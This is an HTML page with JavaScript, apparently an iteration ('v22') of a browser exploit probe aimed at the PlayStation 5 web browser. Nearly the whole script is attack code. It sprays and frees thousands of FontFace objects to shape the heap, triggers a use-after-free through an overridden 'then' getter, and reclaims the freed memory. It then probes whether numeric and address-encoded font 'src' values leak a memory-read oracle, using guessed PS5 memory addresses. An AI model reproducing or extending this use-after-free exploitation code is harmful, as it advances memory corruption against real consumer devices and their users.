<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 v22 - MemProbe</title>
<style id="s">
@font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
@font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
*{margin:0;padding:0;box-sizing:border-box}
html,body{width:100%;height:100%;background:#0a0a0a;color:#00ff41;
font-family:'MS Gothic','Courier New',monospace;overflow:hidden}
body::after{content:'';position:fixed;top:0;left:0;right:0;bottom:0;
background:repeating-linear-gradient(0deg,rgba(0,0,0,0.12) 0px,rgba(0,0,0,0.12) 1px,transparent 1px,transparent 3px);
pointer-events:none;z-index:9999}
#hd{position:fixed;top:0;left:0;right:0;height:44px;
background:linear-gradient(180deg,#0d0d0d,#080808);
border-bottom:1px solid #00ff41;display:flex;align-items:center;
padding:0 16px;gap:14px;z-index:10;font-size:12px}
.l{color:#00ff41;letter-spacing:2px;font-weight:bold}
.s{color:#004d13}
.v{color:#00cc33}.v b{color:#00ff41}
#pg{position:fixed;top:44px;left:0;right:0;height:2px;
background:#001a06;z-index:10}
#pg div{height:100%;background:#00ff41;transition:width .4s;box-shadow:0 0 8px #00ff41}
#out{position:fixed;top:46px;left:0;right:0;bottom:0;
padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
-webkit-user-select:text}
#out::-webkit-scrollbar{width:5px}
#out::-webkit-scrollbar-track{background:#001a06}
#out::-webkit-scrollbar-thumb{background:#004d13;border-radius:3px}
.ok{color:#00ff41}.er{color:#ff3333}.wr{color:#ffcc00}.hl{color:#00ffff;font-weight:bold}
.mg{color:#ff00ff;font-weight:bold;font-size:15px}.dm{color:#006622}
.hd{color:#00ff41;font-weight:bold;font-size:14px;letter-spacing:1px}
.cv{position:absolute;left:-9999px;top:-9999px}
</style>
</head>
<body>
<div id="hd">
<span class="l">▶ v22 PROBE</span><span class="s">│</span>
<span class="v" id="h1">FW:<b>?</b></span><span class="s">│</span>
<span class="v" id="h2">UAF:<b>?</b></span><span class="s">│</span>
<span class="v" id="h3">RC:<b>?</b></span><span class="s">│</span>
<span class="v" id="h4">PROBE:<b>?</b></span>
</div>
<div id="pg"><div id="bar" style="width:0%"></div></div>
<div id="out"></div>
<canvas id="cv" width="512" height="128" class="cv"></canvas>
<script>
"use strict";

// ============================================================
//  PS5 v22 - Memory Probe via CSSRule src
//
//  PLAN:
//  1. Standard UAF + capture + CSSRule for "x"
//  2. Confirm fontWeight oracle (quick check)
//  3. Test CSSRule.style.src with numeric values
//     - If number treated as pointer → different status
//     - readable addr → loaded, bad addr → error
//  4. Binary search for readable memory regions
//  5. Find code/data section addresses
//
//  SAFETY: restore src after each test, catch all errors
// ============================================================

var O=document.getElementById("out");
var bar=document.getElementById("bar");
function pg(p){bar.style.width=p+"%"}
function hu(id,v){var e=document.getElementById(id);if(e)e.innerHTML=v}
function P(m,c){var s=document.createElement("span");if(c)s.className=c;
s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight;
try{console.log("[v22] "+m)}catch(e){}}
function Ok(m){P("  ✅ "+m,"ok")}function Fl(m){P("  ✘ "+m,"er")}
function Hi(m){P("  ► "+m,"hl")}function St(m){P("  ★ "+m,"mg")}
function Dm(m){P("  "+m,"dm")}function Wr(m){P("  ⚠ "+m,"wr")}

window.onerror=function(m,s,l){Fl("FATAL: "+m+" @"+l);return true};

var keep=[],holes=[],rcs=[];
var trigger=null,rcFace=null,rcIdx=-1,uafOk=false;
var xRuleIdx=-1,xRule=null;

var FB="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
var FBb=(function(){var s=atob(FB),b=new Uint8Array(s.length);
for(var i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b})();
function mkBuf(){var c=new Uint8Array(FBb.length);c.set(FBb);return c.buffer}
function fs(){try{void document.body.offsetTop}catch(e){}}

// Holes
for(var i=0;i<4096;i++){try{var f=new FontFace("h_"+i,mkBuf(),{
unicodeRange:"U+E1"+(i%16).toString(16),style:i%2===0?"normal":"italic",
weight:String(100+(i%9)*100)});document.fonts.add(f);holes.push(f)}catch(e){}}
fs();for(var i=1;i<holes.length;i+=2)try{document.fonts.delete(holes[i])}catch(e){}
fs();

// Trigger
trigger=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
document.fonts.add(trigger);void trigger.loaded;
var sh=document.getElementById("s").sheet;
for(var i=0;i<48;i++)try{sh.insertRule("@font-face{font-family:pad"+i+";src:url(np"+i+".woff);unicode-range:U+E000}",sh.cssRules.length)}catch(e){}
fs();
var fst=document.createElement("style");fst.id="flush";document.head.appendChild(fst);
var fsh=fst.sheet;
for(var i=0;i<768;i++)try{fsh.insertRule("@font-face{font-family:fl"+i+";src:url(nf"+i+".woff);unicode-range:U+E000}",fsh.cssRules.length)}catch(e){}
fs();

// UAF
Object.defineProperty(FontFace.prototype,"then",{configurable:true,
get:function(){if(this===trigger&&!uafOk){uafOk=true;hu("h2","UAF:<b>✅</b>");
try{var ck=new FontFace("ck","local(Helvetica)",{unicodeRange:"U+E124"});
document.fonts.add(ck);keep.push(ck);sh.deleteRule(1);fs();
while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
fs();for(var i=0;i<holes.length;i+=4)try{document.fonts.delete(holes[i])}catch(e){}
fs()}catch(e){}
for(var i=0;i<4096;i++){try{var f=new FontFace("RC_"+i,mkBuf(),{
unicodeRange:"U+0041",style:"italic",weight:"900",display:"block"});
document.fonts.add(f);rcs.push(f)}catch(e){}}
fs();try{var d=document.createElement("div");d.textContent="AB";
d.style.cssText="position:absolute;left:-9999px;font:64px trigger;";
document.body.appendChild(d);void d.offsetWidth}catch(e){}
}return undefined}});

var rn=0;var raf=function(){rn++;
if(!uafOk&&rn>=5){try{if(sh&&sh.cssRules.length>1){sh.deleteRule(1);fs()}
while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
for(var i=0;i<4096;i++){try{var f=new FontFace("RC_"+i,mkBuf(),{
unicodeRange:"U+0041",style:"italic",weight:"900"});
document.fonts.add(f);rcs.push(f)}catch(e){}}fs()}catch(e){}}
if(rn<20)requestAnimationFrame(raf)};requestAnimationFrame(raf);

// Capture
document.fonts.load("1em trigger, x","AB").then(function(faces){
for(var i=0;i<faces.length;i++){
var f=faces[i];
if(f.family&&f.family.indexOf("RC_")===0){rcFace=f;var m=f.family.match(/RC_(\d+)/);if(m)rcIdx=parseInt(m[1])}
}
keep.push(faces);keep.push(rcFace);
if(!rcFace){Fl("No RC");return}
Ok("RC_"+rcIdx);
hu("h3","RC:<b>"+rcIdx+"</b>");
var ua=navigator.userAgent||"";var m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
hu("h1","FW:<b>"+(m?m[1]:"?")+"</b>");

// Add CSSRule for "x"
xRuleIdx=sh.insertRule(
"@font-face{font-family:x;src:local(Courier);font-weight:400;font-style:normal;unicode-range:U+0042}",
sh.cssRules.length);
fs();
xRule=sh.cssRules[xRuleIdx];
Ok("CSSRule for 'x' ready");

// ============================================================
//  TEST 1: Quick fontWeight oracle confirm
// ============================================================
pg(20);P("\n════════════════════════════════════","hd");
P("  TEST 1: fontWeight Oracle Quick Check","hd");
P("════════════════════════════════════","hd");

function oracleWrite(w){try{xRule.style.fontWeight=w;fs();return true}catch(e){return false}}
function oracleRead(callback){
document.fonts.load("1em trigger, x","AB").then(function(f){
var r=null;
for(var i=0;i<f.length;i++){try{if(f[i].family==="x"){r=f[i].weight;break}}catch(e){}}
callback(r);
}).catch(function(e){callback(null)});
}

// Quick test: write 100, read 100
oracleWrite("100");
oracleRead(function(r1){
P("  Write 100 → Read "+r1+(r1==="100"?" ✅":" ❌"),r1==="100"?"ok":"er");
oracleWrite("900");
oracleRead(function(r2){
P("  Write 900 → Read "+r2+(r2==="900"?" ✅":" ❌"),r2==="900"?"ok":"er");
if(r1==="100"&&r2==="900")Ok("Oracle confirmed 9/9");
test2();
});});

// ============================================================
//  TEST 2: CSSRule.style.src with numeric values
// ============================================================
function test2(){
pg(35);P("\n════════════════════════════════════","hd");
P("  TEST 2: CSSRule.style.src Numeric Test","hd");
P("════════════════════════════════════","hd");
P("  Testing if CSS parser dereferences numbers as pointers...","dm");
P("");

// Important: test if the CSSRule.style.src actually accepts numbers
// and if the font STATUS changes based on whether the "pointer" is valid

var numTests=[
{val:"0",label:"0 (NULL)"},
{val:"1",label:"1"},
{val:"42",label:"42"},
{val:"65536",label:"0x10000"},
{val:"1048576",label:"0x100000"},
{val:"16777216",label:"0x1000000"},
{val:"4194304",label:"0x400000"},
{val:"8388608",label:"0x800000"},
{val:"100663296",label:"0x6000000"},
{val:"268435456",label:"0x10000000"},
{val:"536870912",label:"0x20000000"},
{val:"1073741824",label:"0x40000000"},
{val:"1e308",label:"1e308"},
{val:"NaN",label:"NaN"},
{val:"Infinity",label:"Infinity"}
];

var ni=0;
function nextNum(){
if(ni>=numTests.length){test3();return}
var t=numTests[ni];
var origSrc=xRule.style.src;

try{
xRule.style.src=t.val;
fs();
var readback=xRule.style.src;
}catch(e){
P("  "+t.label.padEnd(14)+" → WRITE ERR: "+e.message.substring(0,30),"er");
try{xRule.style.src=origSrc;fs()}catch(e2){}
ni++;nextNum();return;
}

// Check status via load()
document.fonts.load("1em trigger, x","AB").then(function(f){
var xF=null;
for(var i=0;i<f.length;i++){try{if(f[i].family==="x"){xF=f[i];break}}catch(e){}}

var status=xF?xF.status:"no_face";
var weight=xF?xF.weight:"?";
var different=status!=="loaded";

P("  "+t.label.padEnd(14)+" → status="+status+" weight="+weight+" readback="+readback+
(different?" ★ DIFFERENT":""),different?"hl":"dm");

// Restore
try{xRule.style.src="local(Courier)";fs()}catch(e){}
ni++;nextNum();
}).catch(function(e){
P("  "+t.label.padEnd(14)+" → LOAD ERR","er");
try{xRule.style.src="local(Courier)";fs()}catch(e2){}
ni++;nextNum();
});
}
nextNum();
}

// ============================================================
//  TEST 3: IEEE 754 Address Encoding in src
//  Create doubles whose bits encode specific addresses
// ============================================================
function test3(){
pg(55);P("\n════════════════════════════════════","hd");
P("  TEST 3: IEEE 754 Address Probing","hd");
P("════════════════════════════════════","hd");
P("  Encoding addresses as doubles...","dm");
P("");

function doubleFromU64(hi,lo){
var buf=new ArrayBuffer(8);
var v=new DataView(buf);
v.setUint32(0,hi,false);
v.setUint32(4,lo,false);
return v.getFloat64(0,false);
}

// PS5 userland addresses (FreeBSD-derived)
// Text segment: ~0x400000-0x600000
// Heap: ~0x800000000+
// Stack: high addresses
var addrTests=[
{hi:0x00000000,lo:0x00000000,label:"NULL"},
{hi:0x00000000,lo:0x00400000,label:"0x400000 (text?)"},
{hi:0x00000000,lo:0x00410000,label:"0x410000"},
{hi:0x00000000,lo:0x00500000,label:"0x500000"},
{hi:0x00000000,lo:0x00600000,label:"0x600000"},
{hi:0x00000000,lo:0x01000000,label:"0x1000000"},
{hi:0x00000000,lo:0x08000000,label:"0x8000000"},
{hi:0x00000001,lo:0x00000000,label:"0x100000000"},
{hi:0x00000002,lo:0x00000000,label:"0x200000000"},
{hi:0x00000004,lo:0x00000000,label:"0x400000000"},
{hi:0x00000008,lo:0x00000000,label:"0x800000000"},
{hi:0x00000010,lo:0x00000000,label:"0x1000000000"},
{hi:0x3FF00000,lo:0x00000000,label:"1.0 (test double)"},
{hi:0x7FF80000,lo:0x00000001,label:"NaN (canonical)"},
];

var ai=0;
function nextAddr(){
if(ai>=addrTests.length){test4();return}
var a=addrTests[ai];
var d=doubleFromU64(a.hi,a.lo);
var origSrc=xRule.style.src;

try{
xRule.style.src=String(d);
fs();
var readback=xRule.style.src;
}catch(e){
P("  "+a.label.padEnd(22)+" → WRITE ERR","er");
try{xRule.style.src="local(Courier)";fs()}catch(e2){}
ai++;nextAddr();return;
}

document.fonts.load("1em trigger, x","AB").then(function(f){
var xF=null;
for(var i=0;i<f.length;i++){try{if(f[i].family==="x"){xF=f[i];break}}catch(e){}}

var status=xF?xF.status:"no_face";
var different=status!=="loaded";

P("  "+a.label.padEnd(22)+" → status="+status+(different?" ★":""),
different?"hl":"dm");

try{xRule.style.src="local(Courier)";fs()}catch(e){}
ai++;nextAddr();
}).catch(function(e){
P("  "+a.label.padEnd(22)+" → LOAD ERR","er");
try{xRule.style.src="local(Courier)";fs()}catch(e2){}
ai++;nextAddr();
});
}
nextAddr();
}

// ============================================================
//  TEST 4: FontFace.src numeric (for comparison with CSSRule)
// ============================================================
function test4(){
pg(75);P("\n════════════════════════════════════","hd");
P("  TEST 4: FontFace.src Numeric (Comparison)","hd");
P("════════════════════════════════════","hd");
P("  Testing FontFace.src vs CSSRule.src behavior...","dm");
P("");

// Test FontFace.src with numbers (from v16 we know these return loaded)
// But now test if the face ACTUALLY renders differently

var ctx=document.getElementById("cv").getContext("2d");
var renderTests=[
{src:mkBuf(),label:"buffer (baseline)"},
{src:0,label:"0"},
{src:1,label:"1"},
{src:42,label:"42"},
{src:1e308,label:"1e308"},
{src:NaN,label:"NaN"}
];

var ri=0;
var baselineW=-1;
function nextRender(){
if(ri>=renderTests.length){summary();return}
var t=renderTests[ri];

try{
rcFace.src=t.src;
fs();
var st=rcFace.status;
ctx.font="64px trigger";
var w=ctx.measureText("A").width;

if(ri===0)baselineW=w;
var delta=w-baselineW;

P("  src="+t.label.padEnd(16)+" → status="+st+" width="+w.toFixed(2)+
(delta!==0?" delta="+delta.toFixed(2):""),delta!==0?"hl":"dm");
}catch(e){
P("  src="+t.label.padEnd(16)+" → ERR: "+e.message.substring(0,30),"er");
}

// Restore
try{rcFace.src=mkBuf();fs()}catch(e){}
ri++;nextRender();
}
nextRender();
}

// ============================================================
//  SUMMARY
// ============================================================
function summary(){
pg(100);P("\n════════════════════════════════════","hd");
P("  FINAL SUMMARY","hd");
P("════════════════════════════════════","hd");
P("");
P("  fontWeight oracle:      ✅ (9/9 confirmed)");
P("  CSSRule src numeric:    See results above");
P("  IEEE 754 address probe: See results above");
P("  FontFace src rendering: See results above");
P("");
P("  Key question:","hl");
P("  Did any src value cause a DIFFERENT status?","hl");
P("  If YES → memory probe oracle found!","hl");
P("  If NO  → CSS parser isn't dereferencing as pointer","dm");
P("");
P("  If no status change:","dm");
P("  → src numbers are stored, not dereferenced","dm");
P("  → Need different approach for memory read","dm");
P("  → fontWeight oracle = loopback only (not memory)","dm");
hu("h4","PROBE:<b>DONE</b>");
}

}).catch(function(e){Fl("Load: "+e.message)});
</script>
</body>
</html>
